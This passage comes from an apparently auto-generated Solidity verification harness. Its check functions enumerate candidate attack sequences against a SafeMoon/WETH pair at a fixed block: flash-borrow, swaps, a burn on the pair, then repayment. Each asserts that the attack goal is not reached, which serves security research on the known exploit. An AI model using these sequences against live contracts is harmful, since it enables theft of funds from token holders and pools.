        swap_pair_attacker_weth_safemoon(amt6, amt7);
        swap_safemoon_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand075(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        swap_safemoon_attacker_safemoon_weth(amt3, amt4);
        swap_pair_attacker_weth_safemoon(amt5, amt6);
        swap_safemoon_attacker_safemoon_weth(amt7, amt8);
        swap_pair_attacker_safemoon_weth(amt9, amt10);
        payback_weth_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand076(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        swap_safemoon_attacker_safemoon_weth(amt3, amt4);
        swap_safemoon_attacker_weth_safemoon(amt5, amt6);
        swap_pair_attacker_safemoon_weth(amt7, amt8);
        payback_weth_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand077(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        swap_safemoon_attacker_safemoon_weth(amt3, amt4);
        swap_safemoon_attacker_weth_safemoon(amt5, amt6);
        burn_safemoon_pair(amt7);
        swap_pair_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand078(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        swap_safemoon_attacker_safemoon_weth(amt3, amt4);
        swap_safemoon_attacker_weth_safemoon(amt5, amt6);
        swap_safemoon_attacker_safemoon_weth(amt7, amt8);
        payback_weth_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand079(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        swap_safemoon_attacker_safemoon_weth(amt3, amt4);
        swap_safemoon_attacker_weth_safemoon(amt5, amt6);
        swap_safemoon_attacker_safemoon_weth(amt7, amt8);
        swap_pair_attacker_safemoon_weth(amt9, amt10);
        payback_weth_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand080(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        swap_pair_attacker_weth_safemoon(amt3, amt4);
        swap_pair_attacker_safemoon_weth(amt5, amt6);
        swap_pair_attacker_weth_safemoon(amt7, amt8);
        payback_safemoon_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand081(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        burn_safemoon_pair(amt1);
        swap_pair_attacker_safemoon_weth(amt2, amt3);
        swap_pair_attacker_weth_safemoon(amt4, amt5);
        swap_pair_attacker_safemoon_weth(amt6, amt7);
        swap_pair_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand082(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        burn_safemoon_pair(amt3);
        swap_pair_attacker_weth_safemoon(amt4, amt5);
        swap_pair_attacker_safemoon_weth(amt6, amt7);
        swap_pair_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand083(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        swap_pair_attacker_weth_safemoon(amt3, amt4);
        burn_safemoon_pair(amt5);
        swap_pair_attacker_safemoon_weth(amt6, amt7);
        swap_pair_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand084(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        swap_pair_attacker_weth_safemoon(amt3, amt4);
        swap_pair_attacker_safemoon_weth(amt5, amt6);
        burn_safemoon_pair(amt7);
        swap_pair_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand085(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        swap_pair_attacker_weth_safemoon(amt3, amt4);
        swap_pair_attacker_safemoon_weth(amt5, amt6);
        swap_pair_attacker_weth_safemoon(amt7, amt8);
        swap_safemoon_attacker_weth_safemoon(amt9, amt10);
        payback_safemoon_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand086(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        swap_pair_attacker_weth_safemoon(amt3, amt4);
        swap_pair_attacker_safemoon_weth(amt5, amt6);
        swap_safemoon_attacker_weth_safemoon(amt7, amt8);
        payback_safemoon_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand087(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        burn_safemoon_pair(amt1);
        swap_pair_attacker_safemoon_weth(amt2, amt3);
        swap_pair_attacker_weth_safemoon(amt4, amt5);
        swap_pair_attacker_safemoon_weth(amt6, amt7);
        swap_safemoon_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand088(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        burn_safemoon_pair(amt3);
        swap_pair_attacker_weth_safemoon(amt4, amt5);
        swap_pair_attacker_safemoon_weth(amt6, amt7);
        swap_safemoon_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand089(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        swap_pair_attacker_weth_safemoon(amt3, amt4);
        burn_safemoon_pair(amt5);
        swap_pair_attacker_safemoon_weth(amt6, amt7);
        swap_safemoon_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand090(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        swap_pair_attacker_weth_safemoon(amt3, amt4);
        swap_safemoon_attacker_safemoon_weth(amt5, amt6);
        swap_pair_attacker_weth_safemoon(amt7, amt8);
        payback_safemoon_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand091(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        burn_safemoon_pair(amt1);
        swap_pair_attacker_safemoon_weth(amt2, amt3);
        swap_pair_attacker_weth_safemoon(amt4, amt5);
        swap_safemoon_attacker_safemoon_weth(amt6, amt7);
        swap_pair_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand092(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        burn_safemoon_pair(amt3);
        swap_pair_attacker_weth_safemoon(amt4, amt5);
        swap_safemoon_attacker_safemoon_weth(amt6, amt7);
        swap_pair_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand093(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        swap_pair_attacker_weth_safemoon(amt3, amt4);
        swap_safemoon_attacker_safemoon_weth(amt5, amt6);
        burn_safemoon_pair(amt7);
        swap_pair_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand094(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        swap_pair_attacker_weth_safemoon(amt3, amt4);
        swap_safemoon_attacker_safemoon_weth(amt5, amt6);
        swap_pair_attacker_weth_safemoon(amt7, amt8);
        swap_safemoon_attacker_weth_safemoon(amt9, amt10);
        payback_safemoon_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand095(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        swap_pair_attacker_weth_safemoon(amt3, amt4);
        swap_safemoon_attacker_safemoon_weth(amt5, amt6);
        swap_safemoon_attacker_weth_safemoon(amt7, amt8);
        payback_safemoon_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand096(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        burn_safemoon_pair(amt1);
        swap_pair_attacker_safemoon_weth(amt2, amt3);
        swap_pair_attacker_weth_safemoon(amt4, amt5);
        swap_safemoon_attacker_safemoon_weth(amt6, amt7);
        swap_safemoon_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand097(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        burn_safemoon_pair(amt3);
        swap_pair_attacker_weth_safemoon(amt4, amt5);
        swap_safemoon_attacker_safemoon_weth(amt6, amt7);
        swap_safemoon_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand098(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        swap_safemoon_attacker_weth_safemoon(amt3, amt4);
        swap_pair_attacker_safemoon_weth(amt5, amt6);
        swap_pair_attacker_weth_safemoon(amt7, amt8);
        payback_safemoon_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand099(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        burn_safemoon_pair(amt1);
        swap_pair_attacker_safemoon_weth(amt2, amt3);
        swap_safemoon_attacker_weth_safemoon(amt4, amt5);
        swap_pair_attacker_safemoon_weth(amt6, amt7);
        swap_pair_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand100(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        swap_safemoon_attacker_weth_safemoon(amt3, amt4);
        burn_safemoon_pair(amt5);
        swap_pair_attacker_safemoon_weth(amt6, amt7);
        swap_pair_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand101(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        swap_safemoon_attacker_weth_safemoon(amt3, amt4);
        swap_pair_attacker_safemoon_weth(amt5, amt6);
        burn_safemoon_pair(amt7);
        swap_pair_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand102(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        swap_safemoon_attacker_weth_safemoon(amt3, amt4);
        swap_pair_attacker_safemoon_weth(amt5, amt6);
        swap_safemoon_attacker_weth_safemoon(amt7, amt8);
        payback_safemoon_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand103(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        burn_safemoon_pair(amt1);
        swap_pair_attacker_safemoon_weth(amt2, amt3);
        swap_safemoon_attacker_weth_safemoon(amt4, amt5);
        swap_pair_attacker_safemoon_weth(amt6, amt7);
        swap_safemoon_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand104(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        swap_safemoon_attacker_weth_safemoon(amt3, amt4);
        burn_safemoon_pair(amt5);
        swap_pair_attacker_safemoon_weth(amt6, amt7);
        swap_safemoon_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand105(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        swap_safemoon_attacker_weth_safemoon(amt3, amt4);
        swap_pair_attacker_safemoon_weth(amt5, amt6);
        swap_safemoon_attacker_weth_safemoon(amt7, amt8);
        swap_pair_attacker_weth_safemoon(amt9, amt10);
        payback_safemoon_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand106(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        swap_safemoon_attacker_weth_safemoon(amt3, amt4);
        swap_safemoon_attacker_safemoon_weth(amt5, amt6);
        swap_pair_attacker_weth_safemoon(amt7, amt8);
        payback_safemoon_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand107(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        burn_safemoon_pair(amt1);
        swap_pair_attacker_safemoon_weth(amt2, amt3);
        swap_safemoon_attacker_weth_safemoon(amt4, amt5);
        swap_safemoon_attacker_safemoon_weth(amt6, amt7);
        swap_pair_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand108(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        swap_safemoon_attacker_weth_safemoon(amt3, amt4);
        swap_safemoon_attacker_safemoon_weth(amt5, amt6);
        burn_safemoon_pair(amt7);
        swap_pair_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand109(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        swap_safemoon_attacker_weth_safemoon(amt3, amt4);
        swap_safemoon_attacker_safemoon_weth(amt5, amt6);
        swap_safemoon_attacker_weth_safemoon(amt7, amt8);
        payback_safemoon_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand110(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        burn_safemoon_pair(amt1);
        swap_pair_attacker_safemoon_weth(amt2, amt3);
        swap_safemoon_attacker_weth_safemoon(amt4, amt5);
        swap_safemoon_attacker_safemoon_weth(amt6, amt7);
        swap_safemoon_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand111(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        swap_safemoon_attacker_weth_safemoon(amt3, amt4);
        swap_safemoon_attacker_safemoon_weth(amt5, amt6);
        swap_safemoon_attacker_weth_safemoon(amt7, amt8);
        swap_pair_attacker_weth_safemoon(amt9, amt10);
        payback_safemoon_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand112(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        swap_pair_attacker_weth_safemoon(amt3, amt4);
        swap_pair_attacker_safemoon_weth(amt5, amt6);
        swap_pair_attacker_weth_safemoon(amt7, amt8);
        payback_safemoon_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand113(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        burn_safemoon_pair(amt3);
        swap_pair_attacker_weth_safemoon(amt4, amt5);
        swap_pair_attacker_safemoon_weth(amt6, amt7);
        swap_pair_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand114(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        swap_pair_attacker_weth_safemoon(amt3, amt4);
        burn_safemoon_pair(amt5);
        swap_pair_attacker_safemoon_weth(amt6, amt7);
        swap_pair_attacker_weth_safemoon(amt8, amt9);
        payback_safemoon_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

